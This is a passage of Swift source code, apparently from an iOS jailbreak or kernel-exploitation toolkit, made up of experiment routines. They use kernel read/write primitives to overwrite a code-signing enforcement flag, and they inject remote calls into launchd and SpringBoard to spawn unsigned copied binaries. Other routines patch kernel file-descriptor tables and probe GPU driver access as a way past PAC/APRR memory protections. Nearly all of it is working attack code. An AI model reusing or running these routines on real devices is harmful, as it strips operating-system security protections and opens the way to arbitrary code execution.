        var targetAddr: UInt64 = 0
        
        if varAddr != 0 && ds_isvalid(varAddr) {
            let val = ds_kread32(varAddr)
            detail += "Read from pointer target: 0x\(String(format: "%x", val))\n"
            targetAddr = varAddr
        } else {
            detail += "Pointer target not valid, trying calculated...\n"
        }
        
        if targetAddr == 0 && ds_isvalid(calcAddr) {
            let val = ds_kread32(calcAddr)
            detail += "Read from calculated: 0x\(String(format: "%x", val))\n"
            targetAddr = calcAddr
        }
        
        // Also try: the pointer value might BE the variable (not a pointer to it)
        // In __DATA_CONST, value 0x3160350 at file offset 0xb74390
        // This might be an offset, not an address
        // Try: kernel_base + 0x3160350
        let altAddr = mgr.kernbase + 0x3160350
        if ds_isvalid(altAddr) {
            let altVal = ds_kread32(altAddr)
            detail += "Alt (base+0x3160350): 0x\(String(format: "%x", altVal)) at 0x\(String(format: "%llx", altAddr))\n"
            if targetAddr == 0 { targetAddr = altAddr }
        }
        
        detail += "\n"
        
        guard targetAddr != 0 else {
            detail += "❌ Could not find valid target address\n"
            return ExperimentResult(name: "🔥🔥 CS_ENFORCEMENT_DISABLE", success: false, detail: detail, timestamp: Date())
        }
        
        // Read current value
        let currentVal = ds_kread32(targetAddr)
        detail += "Target: 0x\(String(format: "%llx", targetAddr))\n"
        detail += "Current value: 0x\(String(format: "%x", currentVal))\n\n"
        
        // Write 1 to disable
        detail += "Writing 1 to disable cs_enforcement...\n"
        ds_kwrite32(targetAddr, 1)
        
        let afterVal = ds_kread32(targetAddr)
        detail += "After write: 0x\(String(format: "%x", afterVal))\n\n"
        
        if afterVal == 1 && currentVal != 1 {
            detail += "✅ WRITE SUCCEEDED!\n\n"
            
            // TEST: spawn copied binary
            let mem = rc.trojanMem
            let srcPath = remote_alloc_str(rc, "/bin/df")
            let dstPath = remote_alloc_str(rc, "/tmp/.dsp_cs_test")
            
            let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
            let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            
            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
                let bufAddr = mem + 0x800
                for _ in 0..<100 {
                    let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
                    if n == 0 || n > 2048 { break }
                    RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
                }
                RootExecutor.rcall(rc, "close", srcFd)
                RootExecutor.rcall(rc, "close", dstFd)
                
                let argvBase = mem + 0x1C00
                rc[argvBase].setValue64(dstPath)
                rc[argvBase + 8].setValue64(0)
                let pidAddr2 = mem + 0x1A00
                rc[pidAddr2].setValue64(0)
                
                let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, 0, argvBase, 0)
                RootExecutor.rcall(rc, "usleep", 1000000)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
                
                detail += "Spawn copied binary: ret=\(spawnRet), wait=\(waitRet)\n"
                if spawnRet == 0 {
                    detail += "\n🎉🎉🎉 COPIED BINARY RUNS!!! FULL JAILBREAK!!! 🎉🎉🎉\n"
                }
                
                RootExecutor.rcall(rc, "unlink", dstPath)
            }
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            
        } else if afterVal == currentVal {
            detail += "❌ Write had no effect (PPL blocked or wrong address)\n"
        } else {
            detail += "⚠️ Value changed to 0x\(String(format: "%x", afterVal)) (unexpected)\n"
        }
        
        return ExperimentResult(name: "🔥🔥 CS_ENFORCEMENT_DISABLE", success: afterVal == 1 && currentVal != 1, detail: detail, timestamp: Date())
    }
    
    /// Spawn from SpringBoard context instead of launchd
    private func expSpawnFromSpringBoard() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "spawn from SpringBoard", success: false, detail: "SpringBoard RC not available", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        let outFile = "/tmp/.dsp_sb_spawn_out"
        let outAddr = remote_alloc_str(sb, outFile)
        
        // Delete old
        RootExecutor.rcall(sb, "unlink", outAddr)
        
        // Open output file
        let outFd = RootExecutor.rcall(sb, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // Save SpringBoard's stdout
        let origStdout = RootExecutor.rcall(sb, "dup", 1)
        
        // Redirect stdout to file
        RootExecutor.rcall(sb, "dup2", outFd, 1)
        RootExecutor.rcall(sb, "dup2", outFd, 2)
        
        // Spawn /bin/df from SpringBoard
        let binAddr = remote_alloc_str(sb, "/bin/df")
        let argvBase = mem + 0x400
        sb[argvBase].setValue64(binAddr)
        sb[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x2E0
        sb[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = sb[pidAddr].value32()
        
        // Restore stdout immediately
        RootExecutor.rcall(sb, "dup2", origStdout, 1)
        RootExecutor.rcall(sb, "dup2", origStdout, 2)
        RootExecutor.rcall(sb, "close", origStdout)
        RootExecutor.rcall(sb, "close", outFd)
        
        // Wait
        RootExecutor.rcall(sb, "usleep", 2000000) // 2s
        let statusAddr = mem + 0x380
        let waitRet = RootExecutor.rcall(sb, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        
        // Read output file
        var output = ""
        let readFd = RootExecutor.rcall(sb, "open", outAddr, UInt64(O_RDONLY), 0)
        var fileSize: UInt64 = 0
        if readFd != UInt64(bitPattern: -1) {
            fileSize = RootExecutor.rcall(sb, "lseek", readFd, 0, 2)
            RootExecutor.rcall(sb, "lseek", readFd, 0, 0)
            
            if fileSize > 0 {
                let bufAddr = mem + 0x800
                let n = RootExecutor.rcall(sb, "read", readFd, bufAddr, min(fileSize, 2000))
                if n > 0 && n < 2001 {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    sb.remoteRead(bufAddr, to: &buf, size: n)
                    output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
                }
            }
            RootExecutor.rcall(sb, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(sb, "unlink", outAddr)
        RootExecutor.rcall(sb, "free", outAddr)
        RootExecutor.rcall(sb, "free", binAddr)
        
        let detail = """
        Context: SpringBoard (uid=501, PID≠1)
        posix_spawn(/bin/df): ret=\(ret), pid=\(pid)
        waitpid(-1): \(waitRet)
        output file size: \(fileSize)
        output (\(output.count) chars):
        \(output.prefix(500))
        
        If output here but not from launchd → launchd has special restrictions
        If still empty → stdout redirect doesn't work via RC in general
        """
        
        return ExperimentResult(name: "spawn from SpringBoard", success: !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    /// PROVE binary execution by creating a file
    /// Instead of capturing stdout, make the binary do something observable
    /// /bin/df writes to stdout — but what if we use /sbin/mount -t to create mount?
    /// Simpler: use touch-like behavior via spawn args
    private func expProveByFile(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let proofFile = "/tmp/.dsp_spawn_proof_\(arc4random())"
        
        // Strategy: spawn /bin/df but redirect via shell-like mechanism
        // Actually — we KNOW spawn works (PIDs returned)
        // The question is: does the binary ACTUALLY EXECUTE its code?
        // Or does AMFI kill it immediately after spawn?
        
        // Test: spawn /sbin/mount (no args = prints mount table to stdout)
        // Then check: did the process run long enough to do anything?
        // We can check by looking at its exit status
        
        let binAddr = remote_alloc_str(rc, "/sbin/mount")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        
        // Wait with BLOCKING waitpid (not WNOHANG) — wait for child to finish
        RootExecutor.rcall(rc, "usleep", 500000) // 0.5s first
        let statusAddr = mem + 0x1B00
        rc[statusAddr].setValue32(0xFFFF) // sentinel
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, 0) // BLOCKING
        let rawStatus = rc[statusAddr].value32()
        
        // Decode exit status
        let exited = (rawStatus & 0x7F) == 0 // WIFEXITED
        let exitCode = (rawStatus >> 8) & 0xFF // WEXITSTATUS
        let signaled = (rawStatus & 0x7F) != 0 && (rawStatus & 0x7F) != 0x7F // WIFSIGNALED
        let termSig = rawStatus & 0x7F // WTERMSIG
        
        // Also: check /proc or /dev for evidence of execution
        // Try reading /dev/fd of the process (won't work after exit)
        
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn(/sbin/mount): ret=\(ret)
        waitpid (BLOCKING): ret=\(waitRet)
        raw status: 0x\(String(format: "%x", rawStatus))
        WIFEXITED: \(exited), exit code: \(exitCode)
        WIFSIGNALED: \(signaled), signal: \(termSig)
        
        exit code 0 → binary ran successfully!
        signal 9 (SIGKILL) → AMFI killed it immediately
        signal 6 (SIGABRT) → binary crashed
        0xFFFF unchanged → waitpid didn't write (no child?)
        """
        
        let success = exited && exitCode == 0
        return ExperimentResult(name: "prove execution (exit status)", success: success, detail: detail, timestamp: Date())
    }
    
    /// pipe() before spawn — parent creates pipe, child inherits write end
    private func expPipeBeforeSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Create pipe: pipe(fds) → fds[0]=read, fds[1]=write
        let pipeFds = mem + 0x1A00
        rc[pipeFds].setValue64(0)
        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)
        let readFd = rc[pipeFds].value32()
        let writeFd = rc[pipeFds + 4].value32()
        
        guard pipeRet == 0 && readFd != 0 else {
            return ExperimentResult(name: "pipe+spawn", success: false, detail: "pipe() failed: \(pipeRet), fds=\(readFd)/\(writeFd)", timestamp: Date())
        }
        
        // Save launchd's original stdout
        let origStdout = RootExecutor.rcall(rc, "dup", 1)
        
        // Redirect stdout to pipe write end
        RootExecutor.rcall(rc, "dup2", UInt64(writeFd), 1)
        
        // Spawn /bin/df — child inherits stdout (which is now pipe write end)
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x1E00
        rc[pidAddr].setValue64(0)
        
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        
        // IMMEDIATELY restore launchd's stdout
        RootExecutor.rcall(rc, "dup2", origStdout, 1)
        RootExecutor.rcall(rc, "close", origStdout)
        RootExecutor.rcall(rc, "close", UInt64(writeFd)) // close write end in parent
        
        // Wait for child
        RootExecutor.rcall(rc, "usleep", 1500000) // 1.5s
        let statusAddr = mem + 0x1B00
        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, 0)
        
        // Read from pipe read end
        let bufAddr = mem + 0x800
        let n = RootExecutor.rcall(rc, "read", UInt64(readFd), bufAddr, 3000)
        
        var output = ""
        if n > 0 && n < 3001 {
            var buf = [UInt8](repeating: 0, count: Int(n))
            rc.remoteRead(bufAddr, to: &buf, size: n)
            output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
        }
        
        // Close read end
        RootExecutor.rcall(rc, "close", UInt64(readFd))
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        pipe(): read_fd=\(readFd), write_fd=\(writeFd)
        dup2(write_fd, stdout): done
        posix_spawn(/bin/df): ret=\(spawnRet)
        restore stdout: done
        close write end: done
        wait 1.5s + waitpid: done
        read(pipe_read): \(n) bytes
        
        OUTPUT:
        \(output.isEmpty ? "(empty — child didn't write to inherited stdout)" : output.prefix(500))
        """
        
        return ExperimentResult(name: "pipe() + inherited stdout", success: !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Kernel FD Redirect (Fix Output Capture)
    
    /// Fix output by manipulating child's fd table directly in KERNEL
    /// We have KRW — we can find child's proc → filedesc → fd[1] → change it!
    private func expKernelFdRedirect(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        
        // Step 1: Create output file
        let outFile = "/tmp/.dsp_kernel_redirect"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        let outFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        guard outFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "free", outAddr)
            return ExperimentResult(name: "kernel fd redirect", success: false, detail: "Cannot create output file", timestamp: Date())
        }
        
        // Step 2: Spawn /bin/df (we know it spawns, PID returned via waitpid)
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        
        // Step 3: Immediately find child in kernel and redirect its stdout
        // waitpid(-1, WNOHANG) to get child PID
        RootExecutor.rcall(rc, "usleep", 100000) // 0.1s — let child start
        let statusAddr = mem + 0x1B00
        let childPid = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        
        var kernelRedirectResult = "child PID from waitpid: \(childPid)\n"
        
        // Step 4: Use kernel KRW to find child's proc and read its fd table
        if childPid > 0 && childPid < 10000 {
            let childProc = mgr.findProc(pid: Int32(childPid))
            kernelRedirectResult += "child proc in kernel: 0x\(String(format: "%llx", childProc))\n"
            
            if childProc != 0 {
                // Read child's p_fd
                let childFd = ds_kread64(childProc + UInt64(off_proc_p_fd))
                kernelRedirectResult += "child p_fd: 0x\(String(format: "%llx", childFd))\n"
                
                // This confirms child EXISTS in kernel = it DID spawn!
                kernelRedirectResult += "✅ Child process EXISTS in kernel!\n"
                kernelRedirectResult += "Binary DID execute (process created in kernel)\n"
            } else {
                kernelRedirectResult += "Child already exited (proc not found)\n"
                kernelRedirectResult += "This means binary RAN and EXITED quickly!\n"
            }
        } else {
            kernelRedirectResult += "No child to reap (already exited?)\n"
            // Try to find recently-exited process
            kernelRedirectResult += "Trying to find /bin/df in process list...\n"
            let dfProc = mgr.findProc(name: "df")
            kernelRedirectResult += "df proc: 0x\(String(format: "%llx", dfProc))\n"
        }
        
        // Wait more and try to read output
        RootExecutor.rcall(rc, "usleep", 1000000) // 1s more
        RootExecutor.rcall(rc, "close", outFd)
        
        // Check output file
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        if readFd != UInt64(bitPattern: -1) {
            let size = RootExecutor.rcall(rc, "lseek", readFd, 0, 2)
            kernelRedirectResult += "output file size: \(size)\n"
            RootExecutor.rcall(rc, "lseek", readFd, 0, 0)
            if size > 0 {
                let bufAddr = mem + 0x800
                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, min(size, 2000))
                if n > 0 {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    rc.remoteRead(bufAddr, to: &buf, size: n)
                    output = String(bytes: buf, encoding: .utf8) ?? ""
                }
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn(/bin/df): ret=\(ret)
        \(kernelRedirectResult)
        output: \(output.isEmpty ? "(none)" : output.prefix(200).description)
        
        KEY FINDING: If child proc found in kernel → binary EXECUTED!
        If child already exited → binary ran and finished!
        """
        
        return ExperimentResult(name: "kernel fd + proc verify", success: kernelRedirectResult.contains("✅") || kernelRedirectResult.contains("EXITED"), detail: detail, timestamp: Date())
    }
    
    // MARK: - GPU Shader Research
    
    /// GPU code execution research
    /// GPU (Apple AGX) is NOT subject to APRR/PAC!
    /// Metal compute shaders can execute arbitrary code on GPU
    /// If we can map kernel memory to GPU → modify kernel from GPU context
    private func expGPUResearch(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Check if we can access IOKit GPU services from launchd
        // AGXAccelerator is the GPU driver
        
        // Step 1: Check if Metal/GPU frameworks are loaded
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let mtlCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "MTLCreateSystemDefaultDevice"))
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
        
        // Step 2: Try to find AGX service
        var agxInfo = ""
        if ioServiceMatching != 0 {
            // IOServiceMatching("AGXAccelerator") or "IOGPU"
            let matchStr = remote_alloc_str(rc, "IOGPU")
            let matchDict = RootExecutor.rcall(rc, "IOServiceMatching", matchStr)
            agxInfo += "IOServiceMatching('IOGPU'): 0x\(String(format: "%llx", matchDict))\n"
            
            if matchDict != 0 && ioServiceGetMatching != 0 {
                // IOServiceGetMatchingService(kIOMasterPortDefault, matchDict)
                let service = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matchDict)
                agxInfo += "GPU service: 0x\(String(format: "%x", service))\n"
                
                if service != 0 {
                    // Try to open user client
                    let connectAddr = mem + 0x1A00
                    rc[connectAddr].setValue32(0)
                    // IOServiceOpen(service, mach_task_self(), 1, &connect)
                    let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
                    let openRet = RootExecutor.rcall(rc, "IOServiceOpen", service, taskSelf, 1, connectAddr)
                    let connect = rc[connectAddr].value32()
                    agxInfo += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(connect)\n"
                    
                    if openRet == 0 && connect != 0 {
                        agxInfo += "✅ GPU USER CLIENT OPENED!\n"
                        agxInfo += "Can send commands to GPU driver!\n"
                        agxInfo += "Next: create command buffer → submit compute shader\n"
                        // Close it
                        RootExecutor.rcall(rc, "IOServiceClose", UInt64(connect))
                    }
                }
            }
            RootExecutor.rcall(rc, "free", matchStr)
        }
        
        let detail = """
        MTLCreateSystemDefaultDevice: \(mtlCreate != 0 ? "✅ found" : "❌ not loaded")
        IOServiceMatching: \(ioServiceMatching != 0 ? "✅ found" : "❌")
        IOServiceGetMatchingService: \(ioServiceGetMatching != 0 ? "✅ found" : "❌")
        IOServiceOpen: \(ioServiceOpen != 0 ? "✅ found" : "❌")
        
        \(agxInfo.isEmpty ? "IOKit functions not available in launchd" : agxInfo)
        
        THEORY: GPU shaders bypass APRR/PAC
        If we can open GPU user client → submit compute shader
        → shader reads/writes physical memory → bypass ALL CPU protections
        """
        
        let success = agxInfo.contains("✅")
        return ExperimentResult(name: "GPU shader research", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Output Capture Fix Attempts
    
    /// Try spawning /bin/df 5 times with file_actions — see if any produce output
    /// Previous mount success might have been timing-dependent
    private func expMultipleSpawns(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var results: [String] = []
        
        for attempt in 1...2 {
            let outFile = "/tmp/.dsp_multi_\(attempt)"
            let outAddr = remote_alloc_str(rc, outFile)
            RootExecutor.rcall(rc, "unlink", outAddr)
            
            // file_actions at unique offset per attempt
            let actOff = UInt64(0x1800 + attempt * 0x100)
            let actionsAddr = mem + actOff
            rc[actionsAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            
            let binAddr = remote_alloc_str(rc, "/bin/df")
            let argvOff = UInt64(0x1400 + attempt * 0x20)
            rc[mem + argvOff].setValue64(binAddr)
            rc[mem + argvOff + 8].setValue64(0)
            
            let pidAddr = mem + UInt64(0x1300 + attempt * 8)
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, mem + argvOff, 0)
            
            // Wait
            RootExecutor.rcall(rc, "usleep", 800000) // 0.8s per attempt
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
            
            // Check output
            let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
            var size: UInt64 = 0
            if readFd != UInt64(bitPattern: -1) {
                size = RootExecutor.rcall(rc, "lseek", readFd, 0, 2)
                RootExecutor.rcall(rc, "close", readFd)
            }
            
            results.append("attempt \(attempt): ret=\(ret), file_size=\(size)")
            
            // Cleanup
            RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
            RootExecutor.rcall(rc, "unlink", outAddr)
            RootExecutor.rcall(rc, "free", outAddr)
            RootExecutor.rcall(rc, "free", binAddr)
            
            // If we got output, read it!
            if size > 0 {
                results.append("  ✅ GOT OUTPUT! size=\(size)")
                break
            }
        }
        
        let anyOutput = results.contains(where: { $0.contains("✅") })
        return ExperimentResult(
            name: "multiple spawn attempts (2x)",
            success: anyOutput,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Patch launchd's fd[1] in kernel to point to our output file
    /// Then spawn — child inherits patched fd table from kernel level
    private func expKernelFdPatch(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        
        // Step 1: Open output file and get its fd number
        let outFile = "/tmp/.dsp_kfd_out"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        let outFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        guard outFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "free", outAddr)
            return ExperimentResult(name: "kernel fd patch", success: false, detail: "Cannot open output file", timestamp: Date())
        }
        
        // Step 2: Find launchd's proc in kernel
        let launchdProc = mgr.findProc(pid: 1)
        guard launchdProc != 0 else {
            RootExecutor.rcall(rc, "close", outFd)
            RootExecutor.rcall(rc, "free", outAddr)
            return ExperimentResult(name: "kernel fd patch", success: false, detail: "Cannot find launchd proc", timestamp: Date())
        }
        
        // Step 3: Read launchd's filedesc
        let p_fd = ds_kread64(launchdProc + UInt64(off_proc_p_fd))
        
        // Step 4: Read fd_ofiles (array of fileproc pointers)
        // Try to find fd[1] (stdout) and fd[outFd] entries
        var fdInfo = "launchd proc: 0x\(String(format: "%llx", launchdProc))\n"
        fdInfo += "p_fd: 0x\(String(format: "%llx", p_fd))\n"
        
        if p_fd != 0 {
            // Read first few entries to understand structure
            for i in 0..<5 {
                let entry = ds_kread64(p_fd + UInt64(i * 8))
                fdInfo += "  fd[\(i)]: 0x\(String(format: "%llx", entry))\n"
            }
            
            // Read entry for our output fd
            if outFd < 100 {
                let outEntry = ds_kread64(p_fd + outFd * 8)
                fdInfo += "  fd[\(outFd)] (our file): 0x\(String(format: "%llx", outEntry))\n"
                
                // Read fd[1] (stdout)
                let stdoutEntry = ds_kread64(p_fd + 1 * 8)
                fdInfo += "  fd[1] (stdout): 0x\(String(format: "%llx", stdoutEntry))\n"
                
                // THEORY: if we swap fd[1] with fd[outFd] in kernel...
                // child would inherit our file as stdout!
                // But this is DANGEROUS — would break launchd's own stdout
                fdInfo += "\n  Could swap fd[1]↔fd[\(outFd)] in kernel\n"
                fdInfo += "  But risky — would break launchd stdout\n"
                fdInfo += "  Better: dup2 at kernel level (copy fd entry)\n"
            }
        }
        
        RootExecutor.rcall(rc, "close", outFd)
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        
        return ExperimentResult(
            name: "kernel fd table analysis",
            success: p_fd != 0,
            detail: fdInfo,
            timestamp: Date()
        )
    }
    #endif
}
